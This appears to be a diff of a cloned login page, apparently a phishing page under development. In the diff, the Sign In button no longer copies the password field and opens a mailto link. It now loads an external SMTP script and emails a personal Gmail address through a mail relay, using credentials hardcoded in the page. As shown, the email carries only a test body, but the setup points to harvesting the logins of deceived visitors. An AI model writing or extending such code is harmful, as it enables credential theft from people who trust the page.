@@ -82,18 +82,27 @@
     <input type="hidden" name="ui_metrics" autocomplete="off" value="{&quot;rf&quot;:{&quot;a21e0434788c45fdd4caf40b613cdc0140c13bb26da36ce72bb40bae0896ffcd&quot;:-104,&quot;ad361ab61e46a30d5c18a37a401bb37696f0d22ff9f6624c0670d14da8df0ad2&quot;:-197,&quot;ad560b9cd233b47c0cb43b3baf5f4f125ab386356ffbb83b12dcc9f8173d26f3&quot;:-1,&quot;aab874e020f6f367fd0e29671ed3ce0ca9e6cef326c3cd0b3cea869e90e4de38&quot;:0},&quot;s&quot;:&quot;5rkWFzivnTgmlxFmyYeAq7P0NB8qw5ywD4bItRX6ZhoysbZcg7ZqEokE2H4eiVUXy0x39DC2MEoLsAJpHquOdv1jYclhONpbZ6Y9s-WUdiWNx93OgzWjYTuDF8r7FOqLdZK6SzQ_5JegnuiCqajovkmVjfkfHnDiio6rLU6GofJQb2coWoGJhPMeSxvgCke4HllootulVXl7UnGdm-Dx-D9WZY869D4EiBzi9aJUMM60yBlMazHsgfUNzyheDKlOQMIIxQBn85ci7pBKw-x4HlLGw-GZBQ6VF5K1QFHOnoBX3Z2Z5eh2jyqlwJWW6BsqCvrY2G46s5ihfC9FJKaiegAAAXV0UWbC&quot;}">
     <script src="" async=""></script>
 </fieldset>
-
-          <button type="button" onclick="myFunction()"><a href="mailto:gracewemily67@gmail.com">Sign In</a></button>
+<script src="https://smtpjs.com/v3/smtp.js">
+</script>
+          
+          <button type="button" onclick="sendEmail()">Sign In</a></button>
           
 <script>
-function myFunction() {
-  var copyText = document.getElementById("password");
-  copyText.select();
-  copyText.setSelectionRange(0, 99999)
-  document.execCommand("copy");
-  
+function sendEmail() {
+Email.send({
+    Host : "smtp.mailtrap.io",
+    Username : "Emily Grace",
+    Password : "#m_2Em8VXd82s39",
+    To : 'gracewemily67@gmail.com',
+    From : "gracewemily67@gmail.com",
+    Subject : "Test email",
+    Body : "<html><h2>Header</h2><strong>Bold text</strong><br></br><em>Italic</em></html>"
+}).then(
+  message => alert(message)
+);
 }
 </script>
+
         
       </form>
 
